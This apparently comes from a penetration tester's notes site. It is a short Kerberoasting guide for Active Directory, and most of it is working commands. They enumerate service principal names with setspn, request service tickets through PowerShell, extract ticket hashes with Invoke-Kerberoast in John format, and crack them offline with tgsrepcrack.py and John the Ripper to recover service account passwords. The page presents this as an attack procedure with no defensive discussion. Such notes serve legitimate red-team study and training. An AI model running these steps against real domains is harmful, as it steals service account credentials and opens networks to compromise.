# Kerberosting

The Service Ticket is encrypted with the SPN password hash. [Requesting a ticket](service-accounts.md#using-mimikatz-to-export-tickets) will allow us to decrypt using brute force (Kerberoasting) with the password hash we already know. This will provide us the clear text password for the service account. SYSTEM/Administrator privileges are not required for this.

### Kerberoasting

{% hint style="info" %}
Ensure to use the kerberoast APT package on linux
{% endhint %}

Utilising tgsrepack.py from the kerberoast package with a wordlist will attempt to crack the service password.

```
python3 /usr/share/kerberoast/tgsrepcrack.py wordlist.txt ServiceTicket.kirbi
```

{% hint style="info" %}
Ensure the service ticket is transferred carefully as it is a binary file and tools like nc may alter the file during transfer. Perhaps consider FTP in binary mode.
{% endhint %}

### Utilising Kerberoast Package

{% hint style="info" %}
[Kerberoast GitHub](https://github.com/nidem/kerberoast)
{% endhint %}

```
PS C:\> setspn -T medin -Q */*
```

#### Get a single service ticket

```
PS C:\> Add-Type -AssemblyName System.IdentityModel  
PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "Service.Name"  
```

#### Get all service tickets

```
PS C:\> Add-Type -AssemblyName System.IdentityModel  
PS C:\> setspn.exe -T medin.local -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
```

### Using Invoke-Kerberoast.ps1 to extract hashes for John

```
PS C:\> Import-Module .\Invoke-Kerberoast.ps1
PS C:\> Invoke-Kerberoast -OutputFormat john | Select-Object -ExpandProperty hash |% {$_.replace(':',':$krb5tgs$23$')}
```

### Cracking with John the Ripper

```
john --format=krb5tgs --wordlist=wordlist.txt kerberos-hash.file
```
